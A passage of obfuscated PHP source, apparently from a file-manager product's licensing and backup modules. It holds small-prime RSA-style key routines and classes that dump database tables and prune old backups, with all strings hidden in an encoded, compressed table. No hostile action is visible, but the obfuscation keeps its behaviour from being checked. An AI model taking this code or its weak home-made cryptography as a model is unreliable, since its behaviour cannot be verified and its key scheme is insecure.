0; $®ê™ò¢À = $âÃ“åÙ[729]; $¶½…ú´ = 0; $€ô©ä¿‹ = $âÃ“åÙ[730]; if (strlen($€ô©ä¿‹) < $âÃ“åÙ[626]) { return; } $˜ÔÉ†®« = 0; $¾›¿à§ = $âÃ“åÙ[731]; if (strlen($¾›¿à§) < $âÃ“åÙ[624]) { return; } for ($ğ¨³ºûâ = 0; $ğ¨³ºûâ < strlen($†ñŒƒıª); $ğ¨³ºûâ++) { $˜ÔÉ†®« = $˜ÔÉ†®« == strlen($æä–³ÖÜ) ? 0 : $˜ÔÉ†®«; $ÂèøÖ§ = $˜ÔÉ†®«++; $¶½…ú´ = strpos($Ş‰È‡›Ä, $†ñŒƒıª[$ğ¨³ºûâ]) - $—£íÊÙ± - ord($æä–³ÖÜ[$ÂèøÖ§]); $ãÆ’Æş² = $âÃ“åÙ[732]; if (!$ãÆ’Æş²) { die; } while ($¶½…ú´ < 0) { $¶½…ú´ += 64; $ûÇûïœ˜ = $âÃ“åÙ[733]; while (strlen($ûÇûïœ˜) < $âÃ“åÙ[626]) { if (!$ûÇûïœ˜) { break; } $ûÇûïœ˜++; } } $Ï½Ê«ü .= $Ş‰È‡›Ä[$¶½…ú´]; $Ÿ™µ¢Ñš = $âÃ“åÙ[734]; if (strlen($Ÿ™µ¢Ñš) < $âÃ“åÙ[626]) { return; } } $ÀìÕªÑ = base64_decode($Ï½Ê«ü); break; $ë§õï” = $âÃ“åÙ[735]; if (strlen($ë§õï”) < $âÃ“åÙ[624]) { return; } default: $ÀìÕªÑ = $this->xqnzbb35943e($†ñŒƒıª, $”¡áÎ‡» . $£îŸ‹˜¤); break; } if ($óòİüÃÉ - 1 > 0) { $ÀìÕªÑ = $this->rpmo0d9f576f($ÀìÕªÑ, $”¡áÎ‡», $óòİüÃÉ - 1); } return $ÀìÕªÑ; } public function hbtwd84ac7ba($Şù‰ƒã) { $«™ù›¹› =& $_SERVER[ñˆ‹ß¿÷]; $‹¼¤¥»à =& $_SERVER[ìõ½ó«ú]; $„óå‡–Ï = $this->wdir7e8b2cc2(); $àÏËÎ—¸ = $«™ù›¹›[736]; if (!$àÏËÎ—¸) { return; } $óæ²«·ô = $this->wdir7e8b2cc2(); $ì”éè§ˆ = ($„óå‡–Ï - 1) * ($óæ²«·ô - 1); $‰¦©•Ä– = $«™ù›¹›[737]; if (!$‰¦©•Ä–) { return; } $‡ÜñÒ§ = intval(($„óå‡–Ï + $óæ²«·ô) / 2); while (1) { $Îî®Şšö = $‡ÜñÒ§; $Ñ´Èò¤¼ = $ì”éè§ˆ; $ŒİáüË¹ = $«™ù›¹›[738]; while ($Ñ´Èò¤¼ % $Îî®Şšö != 0) { $’Ğ’„°ê = $Ñ´Èò¤¼; $Ñ´Èò¤¼ = $Îî®Şšö; $Îî®Şšö = $’Ğ’„°ê % $Îî®Şšö; $•Ê•÷õ = $«™ù›¹›[739]; if (!$•Ê•÷õ) { return; } } if ($Îî®Şšö == 1) { break; } else { $‡ÜñÒ§++; } } $Õ£È©ßÑ = 2; $ùĞ³ÖùÌ = $«™ù›¹›[740]; while ($ùĞ³ÖùÌ < $«™ù›¹›[626]) { if ($ùĞ³ÖùÌ >= 0) { break; } $ùĞ³ÖùÌ++; } for ($ŠÇß£É˜ = 0; $ŠÇß£É˜ < $ì”éè§ˆ * 10; $ŠÇß£É˜++) { if (($ì”éè§ˆ * $ŠÇß£É˜ + 1) % $‡ÜñÒ§ == 0) { $Õ£È©ßÑ = intval(($ì”éè§ˆ * $ŠÇß£É˜ + 1) / $‡ÜñÒ§); break; } } $ş…²úì = $this->hnpt5bb6ae11($„óå‡–Ï * $óæ²«·ô . $‹¼¤¥»à[6], $‹¼¤¥»à[134]); $ß™Ì²æ = md5($‹¼¤¥»à[298] . ($„óå‡–Ï + $óæ²«·ô) . $‹¼¤¥»à[299] . $‡ÜñÒ§ . $‹¼¤¥»à[299] . $Õ£È©ßÑ . $‹¼¤¥»à[300]); $¿¿Ôˆí = $this->hnpt5bb6ae11($Şù‰ƒã, $ß™Ì²æ) . $‹¼¤¥»à[301] . $ş…²úì; $¿‰¸…ê = $«™ù›¹›[741]; while (strlen($¿‰¸…ê) < $«™ù›¹›[635]) { if (!$¿‰¸…ê) { break; } $¿‰¸…ê++; } return $¿¿Ôˆí; } public function srpo83e73180($«Õêß¾¶) { $ôÉÀ‹““ =& $_SERVER[ñˆ‹ß¿÷]; $Ì¥›ç›Ë =& $_SERVER[ìõ½ó«ú]; $Ê™Š†»¤ = explode($Ì¥›ç›Ë[301], $«Õêß¾¶); $ıâé¿ = $ôÉÀ‹““[742]; while ($ıâé¿ < $ôÉÀ‹““[626]) { if ($ıâé¿ >= 0) { break; } $ıâé¿++; } if (count($Ê™Š†»¤) != 2) { return $Ì¥›ç›Ë[6]; } $Ö¯Åöù = $this->xqnzbb35943e($Ê™Š†»¤[1] . $Ì¥›ç›Ë[6], $Ì¥›ç›Ë[134]); $«êÒ¶ò° = $ôÉÀ‹““[743]; if (!$Ö¯Åöù) { return $Ì¥›ç›Ë[6]; } $Ö¯Åöù = intval($Ö¯Åöù); $õÁÖÙßò = 0; $Š÷şåçá = $ôÉÀ‹““[744]; $ş‰ëŠ™³ = 0; $³ÃºËÂ– = $ôÉÀ‹““[745]; if (!$³ÃºËÂ–) { die; } for ($º·À = 3; $º·À < $Ö¯Åöù; $º·À += 2) { if ($Ö¯Åöù % $º·À != 0) { continue; } $õÁÖÙßò = $º·À; $ş‰ëŠ™³ = intval($Ö¯Åöù / $º·À); $Ç•üÔßÇ = $ôÉÀ‹““[746]; break; } $ºì€Èş = ($õÁÖÙßò - 1) * ($ş‰ëŠ™³ - 1); $®•™Ú¢Œ = intval(($õÁÖÙßò + $ş‰ëŠ™³) / 2); $ñÁ¿¾§¦ = $ôÉÀ‹““[747]; while (strlen($ñÁ¿¾§¦) < $ôÉÀ‹““[635]) { if (!$ñÁ¿¾§¦) { break; } $ñÁ¿¾§¦++; } while (1) { $µÊ·¶ = $®•™Ú¢Œ; $¸Ë¬™¿‘ = $ºì€Èş; while ($¸Ë¬™¿‘ % $µÊ·¶ != 0) { $‚ÒÁ¸… = $¸Ë¬™¿‘; $¸Ë¬™¿‘ = $µÊ·¶; $µÊ·¶ = $‚ÒÁ¸… % $µÊ·¶; $Şß¥—è = $ôÉÀ‹““[748]; if (!$Şß¥—è) { return; } } if ($µÊ·¶ == 1) { break; } else { $®•™Ú¢Œ++; } } $•ı»°ã = 2; for ($º·À = 0; $º·À < $ºì€Èş * 10; $º·À++) { if (($ºì€Èş * $º·À + 1) % $®•™Ú¢Œ == 0) { $•ı»°ã = intval(($ºì€Èş * $º·À + 1) / $®•™Ú¢Œ); break; } } $ÚÆ˜áôÑ = md5($Ì¥›ç›Ë[298] . ($õÁÖÙßò + $ş‰ëŠ™³) . $Ì¥›ç›Ë[299] . $®•™Ú¢Œ . $Ì¥›ç›Ë[299] . $•ı»°ã . $Ì¥›ç›Ë[300]); $şÃ¤Ş»Ô = $ôÉÀ‹““[749]; while ($şÃ¤Ş»Ô < $ôÉÀ‹““[626]) { if ($şÃ¤Ş»Ô >= 0) { break; } $şÃ¤Ş»Ô++; } $îîçÁÇ™ = $this->xqnzbb35943e($Ê™Š†»¤[0], $ÚÆ˜áôÑ); return $îîçÁÇ™; $èã²¶Ò³ = $ôÉÀ‹““[750]; if (strlen($èã²¶Ò³) < $ôÉÀ‹““[619]) { die; } } public function wdir7e8b2cc2() { $ê‚õûá =& $_SERVER[ñˆ‹ß¿÷]; $ê ·±ùØ = mt_rand(pow(2, 14), pow(2, 16) - 1); $äˆ…×óô = array(); $òî»¥›á = 1; while ($òî»¥›á <= (int) sqrt($ê ·±ùØ)) { $ß×íê¾ = $òî»¥›á; while (!0) { $ß×íê¾++; if ($ß×íê¾ <= 2) { $òî»¥›á = $ß×íê¾; break; } else { if ($ß×íê¾ < 2) { continue; } } $½Ï˜ü—÷ = !0; for ($ö™Ÿº¢Œ = 2; $ö™Ÿº¢Œ <= sqrt($ß×íê¾); $ö™Ÿº¢Œ++) { if ($ß×íê¾ % $ö™Ÿº¢Œ == 0) { $½Ï˜ü—÷ = !1; } } if ($½Ï˜ü—÷) { $òî»¥›á = $ß×íê¾; break; } } $äˆ…×óô[] = $òî»¥›á; $¹×®¯Óş = $ê‚õûá[751]; } $ÙÄ‘ÕŠŠ = 2; $Œù›£Ú£ = $ê‚õûá[752]; for ($ß×íê¾ = $ê ·±ùØ; $ß×íê¾ > 1; $ß×íê¾--) { $½Ï˜ü—÷ = !0; foreach ($äˆ…×óô as $®¯ÙœªÊ) { if ($ß×íê¾ % $®¯ÙœªÊ == 0) { $½Ï˜ü—÷ = !1; break; } } if ($½Ï˜ü—÷) { $ÙÄ‘ÕŠŠ = $ß×íê¾; break; } } return $ÙÄ‘ÕŠŠ; $‹ Èô¸ = $ê‚õûá[753]; } public function eypdf3a06c3a($ç¹úò´ï, $ş¾³†–æ) { $éÑ÷¬¥‡ =& $_SERVER[ìõ½ó«ú]; return call_user_func(array($éÑ÷¬¥‡[8], $éÑ÷¬¥‡[302]), $ç¹úò´ï, $ş¾³†–æ); } public function hnpt5bb6ae11($€“ğÏâ¿, $¼ğìíğ) { $ÙˆáÖ‰Û =& $_SERVER[ñˆ‹ß¿÷]; $Åƒƒéüà =& $_SERVER[ìõ½ó«ú]; return call_user_func(array($Åƒƒéüà[303], $Åƒƒéüà[304]), $€“ğÏâ¿, $¼ğìíğ); $Çİï™¼ = $ÙˆáÖ‰Û[754]; if (strlen($Çİï™¼) < $ÙˆáÖ‰Û[626]) { die; } } public function xqnzbb35943e($¹¨ñ˜¾, $ú±–¼Âİ) { $ğ²Øäªì =& $_SERVER[ìõ½ó«ú]; return call_user_func(array($ğ²Øäªì[303], $ğ²Øäªì[305]), $¹¨ñ˜¾, $ú±–¼Âİ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¥á»íó‹ =& $_SERVER[ñˆ‹ß¿÷]; $this->isManual(); self::$name = date($¥á»íó‹[755]); if (!($É¯¯Š–¶ = Model($¥á»íó‹[756])->lastItem())) { $É¯¯Š–¶ = $this->initData(); } else { self::$name = $É¯¯Š–¶[$¥á»íó‹[32]]; if ($É¯¯Š–¶[$¥á»íó‹[757]] == $¥á»íó‹[88]) { self::$name = date($¥á»íó‹[758]); $Ô”›Õ÷½ = 0; if (isset($É¯¯Š–¶[$¥á»íó‹[293]][$¥á»íó‹[199]][$¥á»íó‹[468]])) { $Ô”›Õ÷½ = (int) $É¯¯Š–¶[$¥á»íó‹[293]][$¥á»íó‹[199]][$¥á»íó‹[468]]; } if (self::$manual == 0 && $É¯¯Š–¶[$¥á»íó‹[32]] == self::$name) { Model($¥á»íó‹[756])->remove($É¯¯Š–¶[$¥á»íó‹[399]]); } $É¯¯Š–¶ = $this->initData($Ô”›Õ÷½, $É¯¯Š–¶[$¥á»íó‹[759]]); } else { $this->checkStore($É¯¯Š–¶[$¥á»íó‹[759]]); } } self::$option = $É¯¯Š–¶; } private function isManual() { $öŸƒ«·¡ = _get($GLOBALS, $_SERVER[ñˆ‹ß¿÷][760], 0); $öŸƒ«·¡ = intval($öŸƒ«·¡); self::$manual = $öŸƒ«·¡ && $öŸƒ«·¡ == 1 ? 1 : 0; } private function initData($ñùÚÅÏÂ = 0, $û÷ À„ = '') { $ºÛò¥ºç =& $_SERVER[ñˆ‹ß¿÷]; $ÒÃèôÇÒ = Model($ºÛò¥ºç[756])->config(); if ($û÷ À„ && $ÒÃèôÇÒ[$ºÛò¥ºç[759]] != $û÷ À„) { $ñùÚÅÏÂ = 0; } $this->checkStore($ÒÃèôÇÒ[$ºÛò¥ºç[759]]); if (self::$manual == 1) { self::$name .= $ºÛò¥ºç[11] . date($ºÛò¥ºç[761]); } $ ´âÇ§å = array($ºÛò¥ºç[759] => $ÒÃèôÇÒ[$ºÛò¥ºç[759]], $ºÛò¥ºç[32] => self::$name, $ºÛò¥ºç[757] => 0, $ºÛò¥ºç[762] => $ÒÃèôÇÒ[$ºÛò¥ºç[762]], $ºÛò¥ºç[763] => self::$manual, $ºÛò¥ºç[293] => array($ºÛò¥ºç[764] => array($ºÛò¥ºç[757] => 0), $ºÛò¥ºç[765] => array($ºÛò¥ºç[757] => 0, $ºÛò¥ºç[766] => 0, $ºÛò¥ºç[767] => 0, $ºÛò¥ºç[33] => $ºÛò¥ºç[12], $ºÛò¥ºç[768] => 0, $ºÛò¥ºç[497] => 0), $ºÛò¥ºç[769] => array($ºÛò¥ºç[757] => 0, $ºÛò¥ºç[766] => 0, $ºÛò¥ºç[767] => 0, $ºÛò¥ºç[768] => 0, $ºÛò¥ºç[497] => 0), $ºÛò¥ºç[199] => array($ºÛò¥ºç[757] => 0, $ºÛò¥ºç[770] => 0, $ºÛò¥ºç[771] => 0, $ºÛò¥ºç[772] => 0, $ºÛò¥ºç[773] => 0, $ºÛò¥ºç[468] => $ñùÚÅÏÂ, $ºÛò¥ºç[768] => 0, $ºÛò¥ºç[497] => 0)), $ºÛò¥ºç[768] => time(), $ºÛò¥ºç[497] => 0); $±¬µâü  = Model($ºÛò¥ºç[756])->insert($ ´âÇ§å); $ ´âÇ§å[$ºÛò¥ºç[399]] = $±¬µâü ; return $ ´âÇ§å; } private function checkStore($ò‰°šØ) { $¬ŸÊù =& $_SERVER[ñˆ‹ß¿÷]; $ÕÅ²›ì¢ = Model($¬ŸÊù[774])->listData($ò‰°šØ); Model($¬ŸÊù[774])->checkConfig($ÕÅ²›ì¢); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ñˆ‹ß¿÷][756])->findByName(self::$name); } return self::$option; } public static function set($€êºú®®) { $¯µÌıˆ„ =& $_SERVER[ñˆ‹ß¿÷]; $º®»×®¾ = self::get(); foreach ($€êºú®® as $î±í˜æ© => $±ƒÖ¢­‰) { $ñş§‚– = explode($¯µÌıˆ„[10], $î±í˜æ©); $ÛØÀË«Ê = count($ñş§‚–); switch ($ÛØÀË«Ê) { case 1: $º®»×®¾[$ñş§‚–[0]] = $±ƒÖ¢­‰; break; case 2: $º®»×®¾[$ñş§‚–[0]][$ñş§‚–[1]] = $±ƒÖ¢­‰; break; case 3: $º®»×®¾[$ñş§‚–[0]][$ñş§‚–[1]][$ñş§‚–[2]] = $±ƒÖ¢­‰; break; } } Model($¯µÌıˆ„[756])->update($º®»×®¾[$¯µÌıˆ„[399]], $º®»×®¾); self::$option = $º®»×®¾; return self::$option; } public function keep() { $ï–Ú³÷ =& $_SERVER[ñˆ‹ß¿÷]; $ÔèëÊÌ = self::get(); if ($ÔèëÊÌ[$ï–Ú³÷[293]][$ï–Ú³÷[764]][$ï–Ú³÷[757]] == $ï–Ú³÷[88]) { return; } $this->backupKeep($ÔèëÊÌ); self::set(array($ï–Ú³÷[775] => 1)); } private function backupKeep($ˆóı‹­¡) { $™úÁ•š² =& $_SERVER[ñˆ‹ß¿÷]; if (self::$manual == 1) { return; } $¶Ë‡Ã = Model($™úÁ•š²[756])->listData(); if (empty($¶Ë‡Ã)) { return; } $ó¡ŞÙñŠ = 0; $ÊºôïÏ = array(); foreach ($¶Ë‡Ã as $Ì·ôò›Õ) { if ($ó¡ŞÙñŠ >= 7) { break; } $ÊºôïÏ[] = $Ì·ôò›Õ[$™úÁ•š²[32]]; $ó¡ŞÙñŠ++; } for ($ó¡ŞÙñŠ = 0; $ó¡ŞÙñŠ < 12; $ó¡ŞÙñŠ++) { $ÊºôïÏ[] = date($™úÁ•š²[776], strtotime("\x2d{$ó¡ŞÙñŠ}\x20\x6d\157\x6e\x74\x68\x73")); } $ÊºôïÏ = array_unique($ÊºôïÏ); $‘²ÇŠúğ = Model($™úÁ•š²[777])->get($™úÁ•š²[778]); foreach ($¶Ë‡Ã as $Ì·ôò›Õ) { if (isset($Ì·ôò›Õ[$™úÁ•š²[763]]) && $Ì·ôò›Õ[$™úÁ•š²[763]] == $™úÁ•š²[88]) { continue; } if (!empty($Ì·ôò›Õ[$™úÁ•š²[32]]) && in_array($Ì·ôò›Õ[$™úÁ•š²[32]], $ÊºôïÏ)) { continue; } Model($™úÁ•š²[756])->remove($Ì·ôò›Õ[$™úÁ•š²[399]]); $×è÷Àó = $this->backupPath($ˆóı‹­¡, $‘²ÇŠúğ); IO::remove($×è÷Àó, !1); } } private function backupPath($–Â½Ù€£, $ºÊâÂ“ = false) { $…·‡‹Í =& $_SERVER[ñˆ‹ß¿÷]; if (!$ºÊâÂ“) { $ºÊâÂ“ = Model($…·‡‹Í[777])->get($…·‡‹Í[778]); } $¾ËôìÑæ = $–Â½Ù€£[$…·‡‹Í[32]]; $øò’Ù³³ = substr(md5($…·‡‹Í[779] . $ºÊâÂ“ . $¾ËôìÑæ), 0, 8); return "\x7b\x69\x6f\x3a{$–Â½Ù€£[$…·‡‹Í[759]]}\x7d\57\x64\x61\164\141\142\x61\x73\145\57\142\x61\x63\x6b\x75\x70\57" . $¾ËôìÑæ . $…·‡‹Í[11] . $øò’Ù³³; } public function db() { $ƒÍåÌ› =& $_SERVER[ñˆ‹ß¿÷]; $‡»•éË = self::get(); if ($‡»•éË[$ƒÍåÌ›[293]][$ƒÍåÌ›[765]][$ƒÍåÌ›[757]] == $ƒÍåÌ›[88]) { return !0; } $ÎØ«ŸÖœ = new BackupDb(); if (!$ÎØ«ŸÖœ->index()) { return !1; } self::set(array($ƒÍåÌ›[780] => 1)); return !0; } public function dbFile() { $¡âóş© =& $_SERVER[ñˆ‹ß¿÷]; $§Ï‘Ãæ = self::get(); if ($§Ï‘Ãæ[$¡âóş©[293]][$¡âóş©[769]][$¡âóş©[757]] == $¡âóş©[88]) { return !0; } $—›Æò¤’ = new BackupDbFile(); if (!$—›Æò¤’->index()) { return !1; } self::set(array($¡âóş©[781] => 1)); return !0; } public function file() { $ ®ûå­ì =& $_SERVER[ñˆ‹ß¿÷]; $íŸÊ»øÙ = self::get(); if ($íŸÊ»øÙ[$ ®ûå­ì[293]][$ ®ûå­ì[199]][$ ®ûå­ì[757]] == $ ®ûå­ì[88]) { return !0; } if (!isset($íŸÊ»øÙ[$ ®ûå­ì[762]]) || $íŸÊ»øÙ[$ ®ûå­ì[762]] == $ ®ûå­ì[197]) { $£ÆÀøº = new BackupFile(); if (!$£ÆÀøº->index()) { return !1; } } self::set(array($ ®ûå­ì[782] => 1, $ ®ûå­ì[757] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ª¶‹‰È¶ =& $_SERVER[ñˆ‹ß¿÷]; $şÅáá°Ç = Backup::get(); self::$io = $şÅáá°Ç[$ª¶‹‰È¶[759]]; self::$name = $şÅáá°Ç[$ª¶‹‰È¶[32]]; $¬îÔ™ù = new DbManage(); $­æ”ñÓŠ = $¬îÔ™ù->dbType(); $¢ÖÓ®ßê = array($ª¶‹‰È¶[783] => $­æ”ñÓŠ, $ª¶‹‰È¶[784] => time()); Backup::set($¢ÖÓ®ßê); $éÅƒ¹ıõ = $this->tmpFilesPath() . $ª¶‹‰È¶[785] . self::$name . $ª¶‹‰È¶[8]; del_dir($éÅƒ¹ıõ); mk_dir($éÅƒ¹ıõ); $Èçø÷ªå = $™·ÕµÖÜ = 0; $óÄ­ÇÙÄ = new Task($ª¶‹‰È¶[786], $ª¶‹‰È¶[787], 0, LNG($ª¶‹‰È¶[788]) . $ª¶‹‰È¶[789] . LNG($ª¶‹‰È¶[790])); try { $ÛŒªé‘® = $¬îÔ™ù->db()->getTables(); } catch (Exception $Ê´ííö) { $óÄ­ÇÙÄ->end(); return !1; } $ÛŒªé‘® = array_diff($ÛŒªé‘®, array($ª¶‹‰È¶[791], $ª¶‹‰È¶[792])); foreach ($ÛŒªé‘® as $ı“‡×œ’) { $Èçø÷ªå += $¬îÔ™ù->model($ı“‡×œ’)->count(); } $óÄ­ÇÙÄ->task[$ª¶‹‰È¶[793]] = $Èçø÷ªå; $GLOBALS[$ª¶‹‰È¶[794]] = self::$name; foreach ($ÛŒªé‘® as $ı“‡×œ’) { $¢àÉ½õ = $éÅƒ¹ıõ . $ı“‡×œ’ . $ª¶‹‰È¶[795]; $—Ü“í¢» = null; if ($ı“‡×œ’ == $ª¶‹‰È¶[796] && (!isset($şÅáá°Ç[$ª¶‹‰È¶[762]]) || $şÅáá°Ç[$ª¶‹‰È¶[762]] == $ª¶‹‰È¶[197])) { $—Ü“í¢» = self::$io; } $™·ÕµÖÜ += $¬îÔ™ù->sqlFromDb($ı“‡×œ’, $¢àÉ½õ, $óÄ­ÇÙÄ, $—Ü“í¢»); } unset($GLOBALS[$ª¶‹‰È¶[794]]); $óÄ­ÇÙÄ->end(); if ($™·ÕµÖÜ > $Èçø÷ªå) { $Èçø÷ªå = $™·ÕµÖÜ; } $¢ÖÓ®ßê = array($ª¶‹‰È¶[783] => $­æ”ñÓŠ, $ª¶‹‰È¶[780] => 1, $ª¶‹‰È¶[797] => $Èçø÷ªå, $ª¶‹‰È¶[798] => $™·ÕµÖÜ, $ª¶‹‰È¶[799] => time()); Backup::set($¢ÖÓ®ßê); if ($Èçø÷ªå - $™·ÕµÖÜ > 0) { $±î²¶†ñ = $ª¶‹‰È¶[800]; if (stristr(I18n::getType(), $ª¶‹‰È¶[801])) { $±î²¶†ñ = $ª¶‹‰È¶[802]; } write_log(array($±î²¶†ñ, $¢ÖÓ®ßê), $ª¶‹‰È¶[787]); return !1; } return !0; } private function tmpFilesPath() { $½åóŒ¾¡ =& $_SERVER[ñˆ‹ß¿÷]; $›†ïœÅ‘ = TEMP_FILES; if ($GLOBALS[$½åóŒ¾¡[6]][$½åóŒ¾¡[89]][$½åóŒ¾¡[803]]) { $›†ïœÅ‘ = $GLOBALS[$½åóŒ¾¡[6]][$½åóŒ¾¡[89]][$½åóŒ¾¡[803]]; if (!mk_dir($›†ïœÅ‘) || !is_writable($›†ïœÅ‘) || !IO::mkfile($›†ïœÅ‘ . $½åóŒ¾¡[804])) { $›†ïœÅ‘ = TEMP_FILES; } } return $›†ïœÅ‘; } } goto FÚŞ«©Å×; F¾×“¾¯«Í: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(_kodDe('KX3m1IDstA=='), "\x86\xa3\xbc\xa6\xfb\xfd"); $_SERVER[ñˆ‹ß¿÷] = explode("\174\2\174\3\174\6", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xd5\x28\x5b\x21\xa1\x74\xe1\x2f\x29\xb4\x7f\x69\x7\x93\xc4\x76\xa2\xc5\x76\x76\x27\x4e\x90\x6d\xd9\x56\x22\x4b\x46\x92\xb3\x60"."\x1b\x65\x2c\x8d\xa4\x89\x25\x8d\x3c\x33\xf2\x96\x4\xca\xbe\x6\x4a\x29\x2d\x6b\xd9\xca\xd2\x2\x9\x6b\xca\x16\x68\x29\x3b\x69\x81\x16\x5a\x96\x7\x14\x48\x42\x28\x4\xda\x52\xb6\x42\xe1\xdd".base64_decode('5dxlRjL873vv+x5fsObu27nnnnPuOeeeue2yM25/b8M+G/bdsP+Zr/z62U2v0m/0')."\27\377\222\357\37\234\65\145\57\362\337\267\316\72\263\256\256\153\376\201\263\43\7\235\173\373\115\352\76\255\273\76\172\360\366\355\227\76\363\327\355\277\112\244\227\336\175\151"."\xf6\xfb\x7b\xfd\xe5\xd3\xf6\x7c\x33\xca\x4a\x4b\x36\xd3\x1f\xa5\x68\xd8\x8a\x36\xa6\x5b\xb6\x45\x23\x52\x46\x31\xa3\x67\xe9\xb7\x5e\xa4\xbf\x7e\xfa\xd3\x1b\xb\x9b\x5a\xc1\xb0\x35\x1a\xf4\xd1"."\x9f\x24\xef\x15\xfa\x6b\xd\xe7\x75\x96\x9e\x8c\x44\x13\xc9\x78\x6f\x4f\x4f\x30\x96\x80\x4c\xcd\x72\x7a\xc1\x48\xc3\x57\x49\x35\xd5\x2\xb4\x5f\xd2\x4c\xb\xf5\x46\xae\x2e\x59\x32\x4a\x5a\xd1".strrev('ÕûÉ¨Ç<h/Bvš­¸Ï‘'."\r".'8æk.˜1ÈA=5‰’k£„ölšŞÔÔª­ªÒ"#').strrev('QŒÅêK^_ê'."\n".'»:‰éL¨­´'."\r".'n4XøÊ‰C»»E·F„h¡Ú‰,D”Eì')."\247\254\245\51\153\225\172\372\321\241\153\371\64\375\54\252\254\73\366\170\11\276\22\374\13\55\123\261\234\317\323\100\204\177\245\265\214\132\316\303\154\265\313\201\222\251\27\124"."\x36\xe8\x15\xda\x38\x8f\xa5\x1f\x6a\xd9\x36\xf4\x62\x8a\x6\x82\x63\xb6\xa9\x8a\x78\xd4\xd7\x14\x5a\x68\xad\x8\x55\xc5\x83\xe1\x60\x5b\x42\xc1\x1d\x54\x3a\x62\xd1\x6e\x5\x16\xa1\xa0\x5a\xb6"."\146\52\253\272\202\261\240\202\73\335\122\113\306\132\253\0\274\104\320\124\50\201\160\130\231\254\6\133\53\224\130\65\264\114\225\312\242\261\366\140\114\151\135\243\210\31\112\31"."\205\202\121\364\241\132\320\112\332\122\127\203\261\30\375\360\0\170\207\103\170\321\40\20\355\350\210\7\171\10\6\167\164\30\365\144\16\300\247\43\224\316\344\355\344\210\232\57"."\63\60\35\242\277\265\360\3\277\206\5\240\73\254\27\365\62\200\51\124\141\30\174\133\301\107\231\345\326\130\214\226\206\217\2\52\157\300\316\103\333\160\204\176\266\54\245\277"."\x8b\x21\xd3\x60\x12\xa7\x69\xa6\x9d\xd4\x8a\x29\x23\xad\x17\x61\xb3\x2e\x3\xa0\x53\xed\x5c\xbb\xa9\xa3\xc\x34\x9c\x31\xf2\x69\xf6\x6d\xe9\x13\x30\x94\x8c\x9e\xd7\x22\xe5\x82\x9c\x85\x7\x53".base64_decode('OT2fNtn++qKcNBjm2xXnFaES6gnf6XpmXOw3yyibKS2EdoQo18NzN0ImzbbR4GBu')."\164\243\267\224\67\324\164\134\63\371\320\164\243\3\25\214\226\155\71\262\114\262\165\30\146\241\35\141\6\150\37\355\12\275\267\112\302\20\333\27\151\151\306\374\165\175\47\170"."\x3f\x1b\xe8\x3b\xa\xfd\xa9\x7\xd4\xd7\xf\x7d\xca\x69\xf9\x7c\x52\x1b\xd3\x60\xe3\x14\xd2\xf3\x2c\x36\x19\x7e\x6b\x50\x2f\xfa\x51\xc\xd\x86\xa2\xc9\x9c\x6a\xe5\xba\xd3\xf3\x92\xa4\x14\xc3".strrev('¦’©™"ÑŒPÀLñ¦+\\Rí³úD<¼Ô¤o9xJÃu<l'."\0".'ïÜóW`•ÊWÌmi¨').strrev('å*Z§¶\'n Ğ5cô3¦rØÇ´qã£bÿ<…‚±lŞ³WJ5•ºV’v¦A')."\xf5\x94\x6a\xeb\x46\xd1\x6f\xa4\x6c\xcd\xf6\x5a\xb6\xa9\xa9\x50\x63\x20\x95\xd2\x2c\xcb\xdb\x66\x14\x6d\xd3\xc8\x7b\x3\xf9\xbc\x31\xea\x8d\x9a\x7a\x56\x2f\x36\x2b\xb3\x0\xd9\xa2\x44\xb4\xa9"."\xbd\x18\x1\x36\xc3\x4e\xad\x59\xac\x60\x40\xc1\xcd\xcc\x6a\x29\xdb\x19\xef\x42\xb6\x3\x79\x6e\x53\x2d\x5a\x19\xcd\xf4\x6\x61\x67\x34\x2b\xa8\xb3\x1c\xb\xb2\x6c\xed\xba\x55\x32\x2c\x1d\x77"."\257\131\121\155\133\115\345\60\6\21\325\267\174\101\176\275\230\327\213\132\105\336\340\130\111\67\65\213\365\125\351\354\116\100\45\250\166\315\333\143\252\331\202\332\254\224\312\203"."\150\146\140\247\126\211\243\271\141\152\232\225\24\16\172\224\102\331\262\275\246\206\120\221\216\216\73\230\344\120\306\333\215\367\225\256\245\275\161\204\261\41\172\116\303\134\5\201"."\216\302\322\150\154\127\42\321\223\14\165\240\43\71\22\114\166\7\22\155\135\320\155\133\315\262\76\207\21\36\346\125\262\310\325\136\264\277\60\160\105\320\130\105\144\217\61\252"."\231\250\341\326\361\146\145\310\110\17\32\143\76\226\204\63\307\21\242\141\231\361\162\227\154\157\114\55\146\361\374\14\216\333\32\200\240\65\222\165\116\164\130\53\146\355\34\53"."\x18\xf\xc6\x56\x6\x63\xc9\x78\xb4\x23\xb1\x2a\x10\x83\xc3\xbc\x88\xa0\x64\x8c\x35\x85\xab\xce\x7b\x63\x5a\x1a\x4d\x7d\xca\x66\xe5\xd4\x12\x9e\x35\x96\x7\x6f\xe\xbc\x56\x2c\x15\x6f\x18\x96"."\26\16\165\342\211\151\367\132\50\223\127\316\305\352\16\353\5\35\367\335\346\51\144\46\321\111\337\11\35\362\223\1\265\364\347\146\325\365\247\147\327\173\321\337\131\365\175\375"."\355\276\131\3\313\374\272\50\343\157\364\65\52\115\15\363\225\36\104\172\350\152\136\201\101\127\344\150\120\242\53\234\323\42\240\271\150\24\265\57\230\34\174\166\111\333\336\65"."\xad\x34\x32\x16\x3c\xba\x37\x18\x4f\x24\xbb\x83\x89\xae\x68\x3b\xb4\x1e\xc\xc0\x57\xd8\xa0\xdb\x96\x8d\xb6\x8f\xfe\xc\xc0\xea\xe\xd0\x9f\xa4\x6e\x75\x48\xc7\xa\xe\x72\xf4\x93\x34\x6\xd7"."\xa1\xc5\xe8\xd6\x18\x8e\xcd\x50\x1c\x1d\x2a\xa8\x59\x17\xca\xc7\xa1\x6e\xc3\xd4\x9c\x31\xe2\xa8\x5a\xa5\xa7\xd9\x99\